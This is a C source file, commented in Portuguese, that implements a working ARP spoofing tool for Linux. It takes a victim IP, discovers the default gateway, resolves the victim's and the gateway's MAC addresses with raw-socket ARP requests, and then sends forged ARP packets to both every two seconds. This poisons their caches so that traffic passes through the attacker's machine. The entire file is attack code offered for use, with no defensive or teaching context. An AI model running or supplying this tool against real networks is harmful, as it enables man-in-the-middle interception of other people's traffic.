#include <stdint.h>
#include <linux/if_ether.h>
#include <arpa/inet.h>
#include <string.h>
#include <stdio.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <net/if.h>
#include <netpacket/packet.h>
#include <sys/time.h>
#include <errno.h>

/* Estrutura para o cabeçalho ARP */
struct arp_header {
    uint16_t hw_type;
    uint16_t proto_type;
    uint8_t  hw_len;
    uint8_t  proto_len;
    uint16_t opcode;
    uint8_t  sender_mac[6];
    uint8_t  sender_ip[4];
    uint8_t  target_mac[6];
    uint8_t  target_ip[4];
} __attribute__((packed));

struct arp_packet {
    struct ethhdr eth;
    struct arp_header arp;
} __attribute__((packed));

void create_arp_packet(struct arp_packet *pkt, 
                       uint16_t opcode,
                       const uint8_t *sender_mac, const uint8_t *sender_ip,
                       const uint8_t *target_ip, const uint8_t *target_mac) {
    memcpy(pkt->eth.h_source, sender_mac, 6);

    pkt->eth.h_proto = htons(ETH_P_ARP); 

    pkt->arp.hw_type = htons(1); 
    pkt->arp.proto_type = htons(0x0800); 
    pkt->arp.hw_len = 6; 
    pkt->arp.proto_len = 4; 
    pkt->arp.opcode = htons(opcode); 

    memcpy(pkt->arp.sender_mac, sender_mac, 6);
    memcpy(pkt->arp.sender_ip, sender_ip, 4);

    if (opcode == 1) { 
        memset(pkt->eth.h_dest, 0xff, 6);      
        memset(pkt->arp.target_mac, 0x00, 6);  
    } else { 
        memcpy(pkt->eth.h_dest, target_mac, 6);
        memcpy(pkt->arp.target_mac, target_mac, 6);
    }

    memcpy(pkt->arp.target_ip, target_ip, 4);
}

struct arp_packet *reply_loop(int sockfd, const uint8_t *target_ip) {
    static struct arp_packet pkt;
    while (1) {
        ssize_t len = recv(sockfd, &pkt, sizeof(pkt), 0);
        if (len < 0) {
            // Com SO_RCVTIMEO configurado, EAGAIN/EWOULDBLOCK significa timeout (nenhum pacote no prazo)
            if (errno == EAGAIN || errno == EWOULDBLOCK) {
                return NULL; // sem resposta dentro do timeout
            }
            perror("recv");
            continue;
        }

        if (ntohs(pkt.eth.h_proto) == ETH_P_ARP && ntohs(pkt.arp.opcode) == 2) { 
            if (memcmp(pkt.arp.sender_ip, target_ip, 4) == 0) {
                return &pkt; 
            }
        }
    }
}
uint8_t *gateway_ip() {
    FILE *fp = fopen("/proc/net/route", "r");
    if (!fp) { perror("fopen"); return NULL; }

    char line[256];
    while (fgets(line, sizeof(line), fp)) {
        char iface[IFNAMSIZ];
        unsigned long dest, gateway;
        if (sscanf(line, "%s %lx %lx", iface, &dest, &gateway) == 3) {
            if (dest == 0) { // Rota padrão
                static uint8_t gw_ip[4];
                gw_ip[0] = gateway & 0xFF;
                gw_ip[1] = (gateway >> 8) & 0xFF;
                gw_ip[2] = (gateway >> 16) & 0xFF;
                gw_ip[3] = (gateway >> 24) & 0xFF;
                fclose(fp);
                return gw_ip;
            }
        }
    }
    fclose(fp);
    return NULL;
}


int main(int argc, char **argv) {
    if (argc < 2) {
        printf("Uso: %s <IP_ALVO>\n", argv[0]);
        return 1;
    }

    int sockfd;
    struct ifreq ifr;
    struct sockaddr_ll socket_address;
    struct arp_packet pkt;
    uint8_t sender_mac[6], sender_ip[4], target_ip[4], target_mac[6], gw_ip[4], gw_mac[6];

    

    sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
    if (sockfd < 0) { perror("socket"); return 1; }

    // Coletar dados da interface de rede (MAC, IP, INDEX)
    strncpy(ifr.ifr_name, "eth0", IFNAMSIZ-1);
    
    // 1. MAC
    if (ioctl(sockfd, SIOCGIFHWADDR, &ifr) < 0) { perror("ioctl mac"); return 1; }
    memcpy(sender_mac, ifr.ifr_hwaddr.sa_data, 6);

    // 2. IP (Reiniciando ifr_name para garantir)
    strncpy(ifr.ifr_name, "eth0", IFNAMSIZ-1);
    if (ioctl(sockfd, SIOCGIFADDR, &ifr) < 0) { perror("ioctl ip"); return 1; }
    memcpy(sender_ip, &(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr.s_addr), 4);

    // 3. INDEX
    strncpy(ifr.ifr_name, "eth0", IFNAMSIZ-1);
    if (ioctl(sockfd, SIOCGIFINDEX, &ifr) < 0) { perror("ioctl index"); return 1; }
    int ifindex = ifr.ifr_ifindex;

    // IP da vítima vindo da linha de comando
    inet_pton(AF_INET, argv[1], target_ip);
    // IP do gateway descoberto automaticamente
    memcpy(gw_ip, gateway_ip(), 4);
    memset(target_mac, 0xff, 6);
    create_arp_packet(&pkt, 1, sender_mac, sender_ip, target_ip, NULL);

    memset(&socket_address, 0, sizeof(socket_address));
    socket_address.sll_family = AF_PACKET;
    socket_address.sll_protocol = htons(ETH_P_ARP);
    socket_address.sll_ifindex = ifindex;
    socket_address.sll_halen = ETH_ALEN;
    memset(socket_address.sll_addr, 0xff, 6);

    // Diagnóstico
    printf("DEBUG: Enviando de %d.%d.%d.%d [%02x:%02x:%02x:%02x:%02x:%02x]\n",
           sender_ip[0], sender_ip[1], sender_ip[2], sender_ip[3],
           sender_mac[0], sender_mac[1], sender_mac[2], sender_mac[3], sender_mac[4], sender_mac[5]);

    if (sendto(sockfd, &pkt, sizeof(pkt), 0, (struct sockaddr*)&socket_address, sizeof(socket_address)) < 0) {
        perror("sendto");
        return 1;
    }
    printf("ARP Request enviado para %s. Aguardando resposta...\n", argv[1]);

    struct timeval tv;
    tv.tv_sec = 3; 
    tv.tv_usec = 0;
    setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO, (const char*)&
    tv, sizeof tv);

    struct arp_packet *victim_reply = reply_loop(sockfd, target_ip);
    if (!victim_reply) {
        fprintf(stderr, "Nenhuma resposta ARP recebida de %s (timeout).\n", argv[1]);
        close(sockfd);
        return 1;
    }

    printf("Resposta recebida de %d.%d.%d.%d [%02x:%02x:%02x:%02x:%02x:%02x]\n",
           victim_reply->arp.sender_ip[0], victim_reply->arp.sender_ip[1], victim_reply->arp.sender_ip[2], victim_reply->arp.sender_ip[3],
           victim_reply->arp.sender_mac[0], victim_reply->arp.sender_mac[1], victim_reply->arp.sender_mac[2],
           victim_reply->arp.sender_mac[3], victim_reply->arp.sender_mac[4], victim_reply->arp.sender_mac[5]);
    memcpy(target_mac, victim_reply->arp.sender_mac, 6);
    memcpy(pkt.arp.target_ip, gw_ip, 4);
    if (sendto(sockfd, &pkt, sizeof(pkt), 0, (struct sockaddr*)&socket_address, sizeof(socket_address)) < 0) {
        perror("sendto");
        return 1;
    }
    printf("ARP Request enviado para gateway %d.%d.%d.%d\n", gw_ip[0], gw_ip[1], gw_ip[2], gw_ip[3]);
    struct arp_packet *gw_reply = reply_loop(sockfd, gw_ip);
    if (!gw_reply) {
        fprintf(stderr, "Nenhuma resposta ARP recebida do gateway %d.%d.%d.%d (timeout).\n",
                gw_ip[0], gw_ip[1], gw_ip[2], gw_ip[3]);
        close(sockfd);
        return 1;
    }
    memcpy(gw_mac, gw_reply->arp.sender_mac, 6);
    printf("Resposta recebida do gateway %d.%d.%d.%d [%02x:%02x:%02x:%02x:%02x:%02x]\n",
           gw_reply->arp.sender_ip[0], gw_reply->arp.sender_ip[1], gw_reply->arp.sender_ip[2], gw_reply->arp.sender_ip[3],
           gw_reply->arp.sender_mac[0], gw_reply->arp.sender_mac[1], gw_reply->arp.sender_mac[2],
           gw_reply->arp.sender_mac[3], gw_reply->arp.sender_mac[4], gw_reply->arp.sender_mac[5]);
    
    while (1) {
        struct arp_packet poisoned_pkt_victim;
        struct arp_packet poisoned_pkt_gateway;
        create_arp_packet(&poisoned_pkt_victim, 1, sender_mac, gw_ip, target_ip, target_mac);
        memcpy(socket_address.sll_addr, victim_reply->arp.sender_mac, 6);
        if (sendto(sockfd, &poisoned_pkt_victim, sizeof(poisoned_pkt_victim), 0, (struct sockaddr*)&socket_address, sizeof(socket_address)) < 0) {
            perror("sendto victim");
        } else {
            printf("ARP Reply de envenenamento enviado para vítima %d.%d.%d.%d\n",
                   target_ip[0], target_ip[1], target_ip[2], target_ip[3]);
        }

        create_arp_packet(&poisoned_pkt_gateway, 1, sender_mac, target_ip, gw_ip, gw_mac);
        memcpy(socket_address.sll_addr, gw_reply->arp.sender_mac, 6);
        if (sendto(sockfd, &poisoned_pkt_gateway, sizeof(poisoned_pkt_gateway), 0, (struct sockaddr*)&socket_address, sizeof(socket_address)) < 0      ) {
            perror("sendto gateway");
        } else {
            printf("ARP Reply de envenenamento enviado para gateway %d.%d.%d.%d\n",
                   gw_ip[0], gw_ip[1], gw_ip[2], gw_ip[3]);
        }   
        sleep(2);
    }


    return 0;
}